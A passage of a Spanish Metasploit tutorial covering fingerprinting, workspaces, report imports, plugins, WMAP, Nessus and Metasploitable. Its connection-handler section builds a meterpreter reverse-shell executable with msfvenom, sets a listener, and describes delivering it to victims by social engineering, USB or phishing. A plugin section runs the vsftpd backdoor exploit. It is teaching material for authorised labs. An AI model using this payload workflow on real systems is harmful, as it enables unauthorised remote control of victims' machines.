search type:exploit name:ssh
```

---

[🔼](#índice)

---

## **947. Fingerprinting con módulos auxiliares**

### 🧠 ¿Qué es el Fingerprinting?

**Fingerprinting** (huella digital) en ciberseguridad es el proceso de **identificar información específica de un sistema o servicio**, como:

- Sistema operativo (Linux, Windows, etc.).
- Versión de un software (Apache 2.4, nginx 1.18…).
- Servicios y puertos abiertos (FTP, SSH, SMB…).
- Tecnología de una app web (WordPress, Joomla…).

👉 En pocas palabras: **conocer lo máximo posible de la víctima antes de atacar.**

---

### 🔧 ¿Qué es un módulo auxiliar en Metasploit?

Los **módulos auxiliares** en Metasploit son herramientas que **no explotan** vulnerabilidades directamente, sino que ayudan a recopilar información:

- Escanear puertos.
- Enumerar servicios.
- Detectar versiones.
- Buscar vulnerabilidades.
- Realizar fingerprinting.

---

### ✅ ¿Cómo se instala?

**No necesitas instalar nada extra.** Solo asegúrate de tener:

1. Metasploit Framework.
2. Base de datos activa (opcional pero recomendable).
3. Acceso a una red o máquina virtual para pruebas.

Si no tienes Metasploit:

```bash
sudo apt update && sudo apt install metasploit-framework -y
```

---

### 🧪 Ejemplo completo de Fingerprinting con módulos auxiliares

#### 🎯 Objetivo: Realizar fingerprinting de un servidor web.

---

#### 🔹 Paso 1: Iniciar Metasploit

```bash
msfconsole
```

---

#### 🔹 Paso 2: Buscar un módulo auxiliar de fingerprinting

Por ejemplo, vamos a usar uno que detecta tecnología web:

```bash
search http_version
```

Resultado:

```
auxiliary/scanner/http/http_version
```

Este módulo identifica el software web que corre en un servidor (Apache, nginx, etc.).

---

#### 🔹 Paso 3: Usar el módulo

```bash
use auxiliary/scanner/http/http_version
```

---

#### 🔹 Paso 4: Ver y configurar las opciones

```bash
show options
```

Verás algo como esto:

```
RHOSTS     => (IP objetivo)
RPORT      => 80 (puerto por defecto HTTP)
THREADS    => Número de hilos (velocidad)
```

Supongamos que vas a escanear una web local en `192.168.1.105`.

---

#### 🔹 Paso 5: Configurar los parámetros

```bash
set RHOSTS 192.168.1.105
set THREADS 10
```

(Usa `RPORT 443` si es HTTPS)

---

#### 🔹 Paso 6: Ejecutar el escaneo

```bash
run
```

Ejemplo de resultado:

```
[*] http://192.168.1.105:80 - Server: Apache/2.4.41 (Ubuntu)
[*] Scanned 1 of 1 hosts (100% complete)
```

🎯 ¡Ya tienes la huella digital del servidor web!

---

### 📘 Otros módulos auxiliares para fingerprinting

| Módulo                                     | Descripción                       |
| ------------------------------------------ | --------------------------------- |
| `auxiliary/scanner/ftp/ftp_version`        | Detecta versión del servicio FTP  |
| `auxiliary/scanner/ssh/ssh_version`        | Detecta versión del servicio SSH  |
| `auxiliary/scanner/smb/smb_version`        | Identifica versión SMB en Windows |
| `auxiliary/scanner/snmp/snmp_enum`         | Enumera info desde SNMP           |
| `auxiliary/scanner/http/webdav_scanner`    | Detecta WebDAV en servidores web  |
| `auxiliary/scanner/http/wordpress_scanner` | Detecta WordPress y plugins       |

Puedes encontrarlos con:

```bash
search type:auxiliary name:version
```

o simplemente:

```bash
search fingerprint
```

---

### 📌 Ventajas del Fingerprinting con Metasploit

- 🔍 Te da información precisa sobre los servicios.
- 📋 Permite elegir exploits más efectivos.
- ⚙️ Acelera el reconocimiento sin herramientas externas.

---

### 🚨 Buenas prácticas

- Siempre realiza fingerprinting **antes de explotar**.
- No abuses de los módulos en redes que no son tuyas (legalidad).
- Usa entornos de laboratorio (como máquinas virtuales con Metasploitable o TryHackMe).

---

### ✅ Resumen paso a paso

1. Abres Metasploit con `msfconsole`.
2. Buscas un módulo: `search http_version`.
3. Lo usas: `use auxiliary/scanner/http/http_version`.
4. Configuras el objetivo: `set RHOSTS <IP>`.
5. Ejecutas con `run`.
6. Analizas el fingerprinting resultante.

---

[🔼](#índice)

---

## **948. Gestión de espacios de trabajo**

### 🧠 ¿Qué es un espacio de trabajo en Metasploit?

Un **workspace (espacio de trabajo)** en Metasploit es como una carpeta o contenedor lógico donde se guarda toda la información relacionada a una **sesión de pentesting específica**.

Cada espacio de trabajo puede contener:

- Resultados de escaneos (como los de `nmap`, `db_nmap`, etc.).
- Hosts descubiertos.
- Servicios detectados.
- Vulnerabilidades encontradas.
- Credenciales.
- Notas y etiquetas personalizadas.

💡 Esto te permite trabajar de forma **organizada y separada por proyectos**. Por ejemplo:

- `empresaA`
- `cliente-gustavo`
- `lab-practica01`

---

### 📦 ¿Cómo se instala?

Metasploit ya incluye el sistema de workspaces por defecto, **no necesitas instalar nada adicional**.

Solo necesitas:

✅ Tener **Metasploit Framework instalado**.

✅ Tener la **base de datos de Metasploit activa** (PostgreSQL).

Para asegurarte de que la base de datos esté conectada, abre `msfconsole` y verifica:

```bash
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
```

Si no está conectada, puedes iniciar PostgreSQL con:

```bash
sudo service postgresql start
```

---

### 🔧 Comandos principales de gestión de espacios de trabajo

#### 🔹 Ver espacios de trabajo existentes

```bash
workspace
```

Te mostrará algo como:

```
* default
  lab1
  empresa-peru
```

El `*` indica cuál es el espacio de trabajo activo.

---

#### 🔹 Crear un nuevo espacio de trabajo

```bash
workspace -a <nombre>
```

Ejemplo:

```bash
workspace -a cliente-gustavo
```

---

#### 🔹 Cambiar de espacio de trabajo

```bash
workspace <nombre>
```

Ejemplo:

```bash
workspace cliente-gustavo
```

---

#### 🔹 Eliminar un espacio de trabajo

```bash
workspace -d <nombre>
```

Ejemplo:

```bash
workspace -d lab1
```

---

#### 🔹 Renombrar un espacio de trabajo

Metasploit no permite renombrar directamente un workspace. La mejor práctica es:

1. Crear uno nuevo.
2. Exportar e importar datos si es necesario.
3. Eliminar el anterior.

---

### 🧪 Ejemplo completo: Gestión de espacios de trabajo

#### Escenario: Vas a hacer pentesting a 2 clientes distintos: `empresaA` y `empresaB`.

---

#### Paso 1: Iniciar Metasploit

```bash
msfconsole
```

---

#### Paso 2: Verificar el workspace actual

```bash
workspace
```

Deberías ver:

```
* default
```

---

#### Paso 3: Crear un espacio para "empresaA"

```bash
workspace -a empresaA
```

Ahora, cámbiate a ese workspace:

```bash
workspace empresaA
```

---

#### Paso 4: Importar datos o hacer escaneo

Haz un escaneo con Nmap integrado:

```bash
db_nmap -sS -T4 -Pn 192.168.1.105
```

Esto almacenará resultados **solo dentro del workspace `empresaA`**.

---

#### Paso 5: Ver los hosts encontrados

```bash
hosts
```

Puedes ver también:

```bash
services
vulns
```

---

#### Paso 6: Cambiar al otro proyecto

```bash
workspace -a empresaB
workspace empresaB
```

Aquí puedes repetir escaneos, importar datos de Nmap con:

```bash
db_import /ruta/archivo.xml
```

Y quedará todo **aislado**.

---

#### Paso 7: Eliminar uno si ya no lo necesitas

```bash
workspace -d empresaB
```

---

### 🎯 Beneficios de usar workspaces

| Ventaja           | Descripción                                                      |
| ----------------- | ---------------------------------------------------------------- |
| 🔍 Organización   | Mantienes separados los resultados de cada cliente o laboratorio |
| 📂 Histórico      | Puedes volver a consultar escaneos anteriores                    |
| 🤖 Automatización | Puedes automatizar escaneos y exportarlos por workspace          |
| 📊 Reportes       | Más fácil generar reportes por cliente                           |

---

### ✅ Resumen final

| Comando                      | Acción                              |
| ---------------------------- | ----------------------------------- |
| `workspace`                  | Lista todos los espacios de trabajo |
| `workspace -a nombre`        | Crea uno nuevo                      |
| `workspace nombre`           | Cambia al workspace                 |
| `workspace -d nombre`        | Elimina uno                         |
| `db_nmap`                    | Escanea y guarda en el workspace    |
| `hosts`, `services`, `vulns` | Muestran datos del workspace actual |

---

[🔼](#índice)

---

## **949. Importando informes de escáneres de vulnerabilidades**

### 🧠 ¿Qué significa importar informes de escáneres de vulnerabilidades?

Cuando usas herramientas como **Nmap**, **Nessus**, **OpenVAS**, **Qualys**, entre otros, puedes guardar sus resultados en archivos (XML, Nessus, CSV, etc.).
Esos informes se pueden **importar a Metasploit** para:

- Analizar vulnerabilidades detectadas.
- Asignar exploits relacionados.
- Organizar datos por hosts, puertos, servicios, etc.
- Automatizar ataques y pruebas.

---

### 🔧 Escáneres compatibles

Metasploit puede importar informes desde herramientas como:

| Herramienta      | Formato soportado |
| ---------------- | ----------------- |
| Nmap             | `.xml`            |
| Nessus           | `.nessus`         |
| Nexpose (Rapid7) | `.xml` o `.txt`   |
| OpenVAS          | `.xml`            |
| Acunetix         | `.xml`            |

---

### ✅ Requisitos previos

1. Tener **Metasploit Framework** instalado.
2. Tener **PostgreSQL activo** (para la base de datos).
3. Tener el archivo del informe guardado localmente.

Verifica conexión a la base de datos:

```bash
msfconsole
db_status
```

Resultado esperado:

```
[*] Connected to msf. Connection type: postgresql.
```

Si no está conectado:

```bash
sudo service postgresql start
```

---

### 📦 ¿Cómo importar un informe?

Usamos el comando:

```bash
db_import /ruta/del/archivo
```

Ejemplo:

```bash
db_import /home/gustavo/escaneos/nmap-reporte.xml
```

O si fuera de Nessus:

```bash
db_import /home/gustavo/informes/clienteA.nessus
```

---

### 📂 ¿Dónde consigo esos informes?

- **Nmap**:

  ```bash
  nmap -sS -oX nmap-reporte.xml 192.168.1.1
  ```

- **Nessus**:

  Después de escanear, exporta el archivo `.nessus` desde la interfaz web.

- **OpenVAS**:

  Exporta como `XML` desde la consola de resultados.

---

### 🔎 ¿Qué pasa después de importar?

Una vez importado, puedes consultar los datos con:

| Comando    | Descripción                                |
| ---------- | ------------------------------------------ |
| `hosts`    | Lista de hosts encontrados                 |
| `services` | Servicios y puertos por host               |
| `vulns`    | Vulnerabilidades (si el reporte las tiene) |
| `notes`    | Notas asociadas al análisis                |

También puedes usar:

```bash
vulns -h
```

Para más opciones de filtrado.

---

### 🧪 Ejemplo completo paso a paso

#### 🎯 Escenario:

Vas a importar un escaneo hecho con **Nmap** y uno con **Nessus** al workspace `cliente-peru`.

---

#### Paso 1: Crear y activar el workspace

```bash
msfconsole
workspace -a cliente-peru
workspace cliente-peru
```

---

#### Paso 2: Generar el informe en Nmap (fuera de Metasploit)

```bash
nmap -sV -oX nmap-cliente-peru.xml 192.168.1.1
```

---

#### Paso 3: Importar el informe

```bash
db_import /home/gustavo/Documentos/nmap-cliente-peru.xml
```

Verifica:

```bash
hosts
services
```

---

#### Paso 4: Importar un informe de Nessus

Imagina que exportaste desde Nessus un archivo llamado `reporte-nessus.nessus`.

```bash
db_import /home/gustavo/Descargas/reporte-nessus.nessus
```

Verifica:

```bash
vulns
```

---

#### Paso 5: Buscar exploits relacionados

Después de importar y ver las vulnerabilidades, puedes buscar exploits con:

```bash
vulns
```

Y luego:

```bash
search cve:CVE-XXXX-XXXX
```

También puedes automatizarlo con `vulncheck` en algunos casos.

---

### 📤 Exportar resultados desde Metasploit

Si quieres guardar lo importado o generado, puedes usar:

```bash
db_export -f xml -a > exportado.xml
```

O en formato CSV:

```bash
db_export -f csv -a > reporte.csv
```

---

### 🎯 Conclusión

| Acción               | Comando                             |
| -------------------- | ----------------------------------- |
| Importar informe     | `db_import /ruta/archivo`           |
| Ver hosts            | `hosts`                             |
| Ver servicios        | `services`                          |
| Ver vulnerabilidades | `vulns`                             |
| Cambiar workspace    | `workspace nombre`                  |
| Exportar datos       | `db_export -f csv -a > archivo.csv` |

---

[🔼](#índice)

---

## **950. Comando connect**

### 🧠 ¿Qué es el comando `connect` en Metasploit?

El comando `connect` se usa dentro de **Metasploit Framework (msfconsole)** para establecer una **conexión TCP directa con un puerto de un host**, de forma muy similar a la herramienta `telnet` o `nc` (netcat).

🔎 Es útil para:

- Verificar si un **puerto está abierto**.
- Probar **respuestas de servicios** (como un banner).
- Hacer pruebas **manuales de servicios** antes de lanzar un exploit.
- Usarlo como una herramienta de diagnóstico dentro de Metasploit.

---

### 📌 Sintaxis del comando

```bash
connect [IP] [PUERTO]
```

También puedes agregar opciones como:

```bash
connect [IP] [PUERTO] [PROTOCOLO] [INTERFAZ LOCAL] [PUERTO LOCAL]
```

Pero con solo IP y PUERTO es suficiente para la mayoría de casos.

---

### ⚙️ ¿Cómo se instala?

¡No necesitas instalar nada!
`connect` ya viene integrado en **Metasploit Framework**.

#### Solo necesitas:

1. Tener Metasploit Framework instalado.
2. Ejecutar `msfconsole`.

Si aún no lo tienes:

```bash
sudo apt update && sudo apt install metasploit-framework
```

Y luego:

```bash
msfconsole
```

---

### 🧪 Ejemplos simples

#### ✅ Verificar si el puerto 80 (HTTP) está abierto en un servidor

```bash
connect scanme.nmap.org 80
```

Si el puerto está abierto, verás algo como:

```
[*] Connected to scanme.nmap.org:80
```

Puedes incluso escribir manualmente una solicitud HTTP:

```bash
GET / HTTP/1.0
```

Luego presionas dos veces Enter, y verás la respuesta del servidor web.

---

#### 🧪 Verificar si un servidor SSH responde

```bash
connect 192.168.1.10 22
```

Deberías ver algo como:

```
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9
```

Esto indica que está corriendo un servidor SSH.

---

#### ❌ Verificar un puerto cerrado

```bash
connect 192.168.1.10 9999
```

Verás algo como:

```
[-] Failed to connect: Connection refused
```

---

### 📂 ¿Qué diferencia tiene con Netcat o Telnet?

| Herramienta | Integrado en Metasploit | Interacción rápida | Automatización |
| ----------- | ----------------------- | ------------------ | -------------- |
| `connect`   | ✅ Sí                   | ✅ Sí              | ✅ Alta        |
| `netcat`    | ❌ No                   | ✅ Sí              | ✅ Media       |
| `telnet`    | ❌ No                   | ❌ Antigua         | ❌ Baja        |

`connect` es más rápido y cómodo si ya estás trabajando dentro de `msfconsole`.

---

### 🧑‍💻 Ejemplo completo paso a paso

#### 🎯 Escenario:

Supón que estás analizando el host `192.168.1.20`, quieres verificar si sus puertos:

- 22 (SSH)
- 80 (HTTP)
- 443 (HTTPS)

Están abiertos.

---

#### Paso 1: Iniciar Metasploit

```bash
msfconsole
```

---

#### Paso 2: Verificar puerto 22

```bash
connect 192.168.1.20 22
```

**Respuesta esperada**:

```
[*] Connected to 192.168.1.20:22
SSH-2.0-OpenSSH_8.4
```

---

#### Paso 3: Verificar puerto 80

```bash
connect 192.168.1.20 80
```

Luego puedes escribir:

```bash
GET / HTTP/1.1
Host: 192.168.1.20
```

Y presionar dos veces Enter. Verás algo como:

```
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
```

---

#### Paso 4: Verificar puerto 443

```bash
connect 192.168.1.20 443
```

🔒 Este puerto usa **HTTPS (SSL)**, por lo que verás datos cifrados o ilegibles. Esto indica que el puerto está abierto, pero el contenido no es visible directamente.

---

### ✅ Resumen final

| Tarea                          | Comando                      |
| ------------------------------ | ---------------------------- |
| Verificar puerto abierto       | `connect IP PUERTO`          |
| Ver respuesta del servidor web | `connect IP 80` + `GET ...`  |
| Detectar puerto cerrado        | Mensaje "Connection refused" |
| Interactuar con SSH            | `connect IP 22`              |

---

[🔼](#índice)

---

## **951. Plugins de Metasploit**

### 🔍 ¿Qué son los plugins de Metasploit?

Los **plugins en Metasploit** son **extensiones** que agregan **nuevas funcionalidades** a `msfconsole`. Algunos permiten integrar otras herramientas, guardar resultados, interactuar con bases de datos, automatizar tareas o mejorar el entorno de trabajo.

📌 **Diferencia entre plugin y módulo**:

| Característica | Plugin                               | Módulo                                                 |
| -------------- | ------------------------------------ | ------------------------------------------------------ |
| Función        | Extiende funcionalidades             | Exploits, escaneos, payloads                           |
| Carga manual   | Sí (`load plugin`)                   | No (se seleccionan con `use`)                          |
| Ejemplos       | database, pcap_log, event_timestamps | auxiliary/scanner, exploit/windows/smb/ms08_067_netapi |

---

### 📁 ¿Dónde están los plugins?

Los plugins se encuentran generalmente en:

```
/opt/metasploit-framework/plugins/
```

O si lo instalaste vía Git:

```
~/.msf4/plugins/
```

Puedes crear o descargar nuevos plugins (en Ruby) y colocarlos allí.

---

### 🧰 ¿Cómo se listan los plugins disponibles?

Dentro de `msfconsole`, ejecuta:

```bash
help
```

O directamente:

```bash
load
```

Y te mostrará los disponibles si tienes acceso al directorio.

---

### ⚙️ ¿Cómo se instala un plugin?

No se instala, **se carga** en Metasploit:

```bash
load nombre_del_plugin
```

📌 Ejemplo:

```bash
load pcap_log
```

Te da la funcionalidad de capturar tráfico de red generado por exploits.

---

### 📌 Plugins comunes e importantes

| Plugin                    | Función principal                                                                |
| ------------------------- | -------------------------------------------------------------------------------- |
| `pcap_log`                | Captura tráfico de red generado por los exploits de Metasploit.                  |
| `database`                | Maneja base de datos para almacenar resultados, escaneos, hosts, servicios, etc. |
| `event_timestamps`        | Muestra la hora exacta en que ocurren los eventos dentro de Metasploit.          |
| `local_admin_search_enum` | Enumera si tienes privilegios de administrador local en máquinas remotas.        |
| `wmap`                    | Framework de escaneo de aplicaciones web.                                        |

---

### 💡 Ejemplo simple de uso

#### Paso 1: Abrir `msfconsole`

```bash
msfconsole
```

#### Paso 2: Cargar un plugin

```bash
load pcap_log
```

Respuesta esperada:

```
[*] Successfully loaded plugin: pcap_log
```

Ahora cada tráfico generado se guardará en `/tmp/msf3-pcap.log`.

---

### 📦 Instalar un nuevo plugin personalizado (opcional)

Si encuentras un plugin en GitHub:

```bash
cd ~/.msf4/plugins
wget https://URL_DEL_PLUGIN/plugin.rb
```

Y luego desde Metasploit:

```bash
load plugin
```

---

### 🧑‍💻 Ejemplo completo: Capturar tráfico con el plugin `pcap_log`

#### 🎯 Objetivo:

Lanzar un exploit y capturar el tráfico generado.

---

#### Paso 1: Abrir Metasploit

```bash
msfconsole
```

---

#### Paso 2: Cargar el plugin `pcap_log`

```bash
load pcap_log
```

Verás:

```
[*] Successfully loaded plugin: pcap_log
```

---

#### Paso 3: Seleccionar un exploit (ejemplo local)

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.5
set RPORT 21
run
```

---

#### Paso 4: Ver el tráfico capturado

El archivo estará en:

```bash
/tmp/msf3-pcap.log
```

Puedes analizarlo con Wireshark:

```bash
wireshark /tmp/msf3-pcap.log
```

---

### ✅ Resumen rápido

| Tarea                     | Comando                  |
| ------------------------- | ------------------------ |
| Cargar plugin             | `load nombre_del_plugin` |
| Ver funcionalidades extra | Depende del plugin       |
| Plugin para tráfico pcap  | `load pcap_log`          |
| Plugin para timestamps    | `load event_timestamps`  |
| Ver plugins en ruta       | `ls ~/.msf4/plugins`     |

---

[🔼](#índice)

---

## **952. Análisis de vulnerabilidades con WMAP**

### 🔍 ¿Qué es WMAP?

**WMAP** es un **plugin de Metasploit** que funciona como un **escáner de vulnerabilidades para aplicaciones web**. Se basa en el famoso **Nikto**, pero está totalmente integrado en el Metasploit Framework.

👉 Con WMAP puedes:

- Escanear aplicaciones web en busca de fallos comunes.
- Detectar configuraciones erróneas, directorios sensibles, formularios inseguros.
- Integrar resultados con los módulos de explotación de Metasploit.

---

### ✅ Requisitos para usar WMAP

1. Tener **Metasploit Framework** instalado.
2. Estar dentro de `msfconsole`.
3. Tener cargado el **plugin WMAP**.
4. Contar con una **URL objetivo**.

---

### 🛠️ Instalación (cargar WMAP)

WMAP no se instala por separado, **se carga como plugin** dentro de Metasploit:

```bash
msfconsole
```

Una vez dentro:

```bash
load wmap
```

Si todo va bien verás:

```
[*] Successfully loaded plugin: wmap
```

---

### 📋 Comandos básicos de WMAP

Después de cargar el plugin, se habilitan comandos que empiezan con `wmap_`.

| Comando           | Descripción                                      |
| ----------------- | ------------------------------------------------ |
| `wmap_sites`      | Manejo de sitios (agregar, listar, eliminar)     |
| `wmap_targets`    | Selección de objetivos                           |
| `wmap_run`        | Iniciar el escaneo                               |
| `wmap_modules -l` | Lista los módulos disponibles                    |
| `wmap_run -t`     | Escanea el objetivo actual con todos los módulos |

---

### 📌 Flujo completo de escaneo con WMAP

#### 1. Cargar el plugin

```bash
load wmap
```

---

#### 2. Agregar el objetivo

```bash
wmap_sites -a http://192.168.1.105
```

📌 Este comando agrega el sitio a la base de datos.

---

#### 3. Verifica el sitio agregado

```bash
wmap_sites -l
```

---

#### 4. Selecciona el objetivo

```bash
wmap_targets -t http://192.168.1.105
```

---

#### 5. Lista los módulos disponibles

```bash
wmap_modules -l
```

Puedes ver módulos como:

- `auxiliary/scanner/http/http_put`
- `auxiliary/scanner/http/webdav_scanner`
- `auxiliary/scanner/http/dir_scanner`

---

#### 6. Ejecutar escaneo con todos los módulos

```bash
wmap_run -t
```

Esto comienza el escaneo de la URL seleccionada con todos los módulos relacionados a WMAP.

⏱️ El escaneo puede tomar varios minutos.

---

#### 7. Ver resultados

Después del escaneo puedes revisar el output en la consola, o combinarlo con el sistema de base de datos de Metasploit para guardar todo:

```bash
db_status      # Verifica si está activada la base de datos
services       # Ver los servicios detectados
vulns          # Ver vulnerabilidades encontradas
```

---

### ✅ Ejemplo completo (resumen rápido)

Supón que quieres escanear la app `http://testphp.vulnweb.com`:

```bash
msfconsole
```

```bash
load wmap
wmap_sites -a http://testphp.vulnweb.com
wmap_targets -t http://testphp.vulnweb.com
wmap_modules -l
wmap_run -t
```

Luego puedes ver vulnerabilidades con:

```bash
vulns
```

---

### 💡 Consejo adicional

Puedes combinar WMAP con otros módulos de Metasploit como:

```bash
use auxiliary/scanner/http/dir_scanner
set RHOSTS testphp.vulnweb.com
run
```

---

### 🧠 En resumen

- ✅ **WMAP** es un plugin de Metasploit para escanear sitios web.
- ⚙️ **Se carga con** `load wmap` en `msfconsole`.
- 📍 Se usa con comandos como `wmap_sites`, `wmap_targets`, `wmap_run`.
- 🔎 Es útil para encontrar vulnerabilidades como PUT activado, directorios expuestos, inyecciones, etc.
- 🔗 Ideal para combinar con otros módulos auxiliares o explotación.

---

[🔼](#índice)

---

## **953. Análisis de vulnerabilidades con Nessus**

### 🔍 ¿Qué es Nessus?

**Nessus** es una herramienta profesional desarrollada por **Tenable** que permite realizar **escaneos de vulnerabilidades** en sistemas, redes y servicios. Es ampliamente usada por **auditores de seguridad, pentesters y analistas** para:

- Detectar puertos abiertos.
- Identificar servicios y versiones vulnerables.
- Detectar configuraciones erróneas.
- Generar reportes detallados en PDF, HTML, etc.

---

### 🧩 Tipos de Nessus

- **Nessus Essentials (Gratis)** – Para estudiantes o usuarios personales (hasta 16 IPs).
- **Nessus Professional (Pago)** – Para entornos empresariales.

Nos enfocaremos en **Nessus Essentials**, que es gratuito.

---

### 🛠️ Instalación de Nessus Essentials (Windows / Linux)

#### 🔹 Para Windows

1. Ir al sitio oficial:
   👉 [https://www.tenable.com/products/nessus/nessus-essentials](https://www.tenable.com/products/nessus/nessus-essentials)

2. Selecciona tu sistema operativo y descarga el instalador.

3. Instala el programa normalmente.

4. Se abrirá una página web como `https://localhost:8834/`.

5. Crea una cuenta gratuita con tu correo para activar la licencia de Essentials (recibirás un código de activación).

6. Ingresa el código en el navegador cuando lo pida.

7. Espera a que se actualicen los plugins. Toma de 5 a 10 minutos.

---

#### 🔹 Para Linux (ej. Ubuntu)

```bash
wget https://www.tenable.com/downloads/api/v1/public/pages/nessus/downloads/15084/download?i_agree_to_tenable_license_agreement=true -O Nessus.deb

sudo dpkg -i Nessus.deb
sudo systemctl start nessusd
```

Luego abre en tu navegador:

👉 `https://localhost:8834/` y sigue el mismo proceso de activación.

---

### ✅ Cómo usar Nessus paso a paso

#### 1. Entrar al panel

Después de instalado, accede desde el navegador a:

```bash
https://localhost:8834/
```

---

#### 2. Crear nuevo escaneo

- Haz clic en **"New Scan"**
- Escoge el tipo de escaneo (ejemplo: "Basic Network Scan")
- Llena los campos:

  - **Name**: "Escaneo de prueba"
  - **Targets**: La IP o el dominio del sistema a analizar (por ejemplo: `192.168.1.105` o `scanme.nmap.org`)

---

#### 3. Guardar y lanzar escaneo

- Clic en **Save**.
- Luego, desde el panel de escaneos, haz clic en **"Launch"**.

El escaneo puede tardar de 1 a 10 minutos, dependiendo del objetivo.

---

#### 4. Ver resultados

Cuando termina, puedes ver:

- Puertos abiertos
- Servicios detectados (FTP, SSH, HTTP, etc.)
- Vulnerabilidades clasificadas por severidad: **Critical**, **High**, **Medium**, **Low**, **Info**

Puedes hacer clic en cada vulnerabilidad para ver:

- Descripción
- CVE asociado
- Solución recomendada

---

#### 5. Generar reporte

Puedes exportar el resultado en:

- PDF
- HTML
- CSV

Desde la vista del escaneo → clic en el botón de **exportar (Export)**.

---

### ✅ Ejemplo completo: escaneo a `scanme.nmap.org`

#### Paso 1: Crear escaneo básico

- Name: `Escaneo de prueba`
- Targets: `scanme.nmap.org`

#### Paso 2: Ejecutar el escaneo

- Launch → espera 3–5 minutos.

#### Paso 3: Analizar el resultado

- Vulnerabilidad: por ejemplo, **"SSL Medium Strength Cipher Suites Supported"**
- CVE: `CVE-2016-2183`
- Solución sugerida: Desactivar suites débiles en la configuración del servidor web.

#### Paso 4: Exportar

- Export as → PDF → "guardar como: escaneo_nessus.pdf"

---

### 🧠 Ventajas de Nessus

✅ Fácil de usar

✅ Muy detallado en sus reportes

✅ Base de datos de vulnerabilidades constantemente actualizada

✅ Ideal para redes internas, servidores, PCs, routers, etc.

---

### 🚫 Advertencia ética

> ⚠️ **Nunca escanees sistemas que no sean tuyos o que no tengas autorización explícita para analizar.** El uso indebido de Nessus puede ser ilegal y violar políticas de seguridad.

---

### ✅ En resumen

| Paso | Acción                         |
| ---- | ------------------------------ |
| 1    | Instalar Nessus Essentials     |
| 2    | Acceder vía navegador          |
| 3    | Crear escaneo nuevo            |
| 4    | Ejecutar y analizar resultados |
| 5    | Exportar reporte               |

---

[🔼](#índice)

---

## **954. Connection Handler**

### 🔍 ¿Qué es un Connection Handler?

Un **Connection Handler** (manejador de conexiones) es un módulo dentro de herramientas como **Metasploit** que **espera conexiones entrantes** desde máquinas objetivo.

Se utiliza para:

- **Escuchar** conexiones de vuelta (reverse shell).
- **Establecer sesiones** con payloads que envían la conexión desde el objetivo hacia el atacante.
- No necesita explotar una vulnerabilidad directamente; solo espera la conexión del payload.

Piensa en él como un "teléfono" que está esperando que alguien lo llame.

---

### 🧠 ¿Para qué sirve?

Sirve principalmente cuando:

1. Has entregado un **payload (ej. reverse shell)** al objetivo manualmente o por ingeniería social.
2. El objetivo ejecuta el payload.
3. El Connection Handler **recibe la conexión** y crea una sesión para interactuar con la máquina víctima.

---

### 🛠️ Cómo instalar Metasploit (si aún no lo tienes)

#### En Kali Linux (ya viene instalado normalmente)

```bash
sudo apt update
sudo apt install metasploit-framework
```

#### En Ubuntu

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfinstall | sudo bash
```

Para iniciar:

```bash
msfconsole
```

---

### 🧪 ¿Cómo usar un Connection Handler en Metasploit?

#### 📌 Paso 1: Abrir Metasploit

```bash
msfconsole
```

---

#### 📌 Paso 2: Usar el módulo de Connection Handler

```bash
use exploit/multi/handler
```

Este módulo no lanza ataques, solo **espera una conexión**.

---

#### 📌 Paso 3: Configurar el payload que estás esperando

Por ejemplo, un **payload reverse shell** de meterpreter para Windows:

```bash
set payload windows/meterpreter/reverse_tcp
```

---

#### 📌 Paso 4: Configurar la IP y puerto de escucha

```bash
set LHOST 192.168.1.100   # Tu IP local o pública
set LPORT 4444            # Puerto de escucha
```

Verifica con:

```bash
show options
```

---

#### 📌 Paso 5: Iniciar el handler

```bash
exploit
```

Ahora Metasploit está **escuchando activamente** en `192.168.1.100:4444`.

---

### 🔨 Ejemplo completo: Conexión con un payload manual

#### 🧱 Supuesto escenario

- IP atacante (tu máquina con Metasploit): `192.168.1.100`
- IP víctima: `192.168.1.105`
- Crearás un payload para que la víctima lo ejecute.

---

#### Paso 1: Crear el payload

En tu terminal:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe
```

Esto genera un ejecutable `shell.exe` que al ser ejecutado enviará una conexión de vuelta.

---

#### Paso 2: Configurar el Connection Handler

```bash
msfconsole

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit
```

Queda "escuchando" en espera de la víctima.

---

#### Paso 3: Entregar el payload

Por ingeniería social o USB, haces que la víctima ejecute `shell.exe`.

---

#### Resultado

Cuando la víctima ejecuta el archivo, verás en tu terminal:

```
[*] Sending stage (175174 bytes) to 192.168.1.105
[*] Meterpreter session 1 opened (192.168.1.100:4444 -> 192.168.1.105:49156)
```

¡Tienes acceso a la máquina víctima! 🎯 Puedes ahora interactuar con el sistema:

```bash
meterpreter > sysinfo
meterpreter > screenshot
meterpreter > shell
```

---

### ✅ ¿Cuándo usar Connection Handler?

- Cuando **ya tienes un payload personalizado** y quieres tener control de la conexión.
- En pruebas **sin exploit directo**, como campañas de phishing.
- En entornos **donde el firewall bloquea conexiones entrantes**, pero permite salientes.

---

### ⚠️ Advertencia ética

> Nunca utilices un Connection Handler ni payloads con fines maliciosos. Solo en entornos de laboratorio o con autorización. Su uso indebido puede ser delito penal.

---

### 📌 En resumen

| Acción                 | Comando                                       |
| ---------------------- | --------------------------------------------- |
| Iniciar Metasploit     | `msfconsole`                                  |
| Usar handler           | `use exploit/multi/handler`                   |
| Establecer payload     | `set payload windows/meterpreter/reverse_tcp` |
| Configurar IP y puerto | `set LHOST <tu_IP>` / `set LPORT 4444`        |
| Escuchar conexiones    | `exploit`                                     |
| Generar payload manual | `msfvenom -p ... -o shell.exe`                |
| Esperar sesión         | `meterpreter session opened`                  |

---

[🔼](#índice)

---

## **955. Instalación de maquina de pruebas Metasploitable**

### 🛡️ ¿Qué es Metasploitable?

**Metasploitable** es una máquina virtual **vulnerable a propósito**, diseñada por Rapid7 para que puedas practicar legalmente pruebas de penetración y hacking ético con herramientas como **Metasploit**, **Nmap**, **Nikto**, **WPScan**, etc.

---

### 🎯 ¿Para qué sirve?

- Entrenarte en **seguridad ofensiva** y **auditoría de vulnerabilidades**.
- Aprender a usar herramientas como **Nmap, Nessus, Metasploit, Hydra, etc.**
- Simular ataques sin romper la ley (entorno controlado y local).
- Ideal para principiantes en ciberseguridad.

---

### 💻 ¿Qué necesitas?

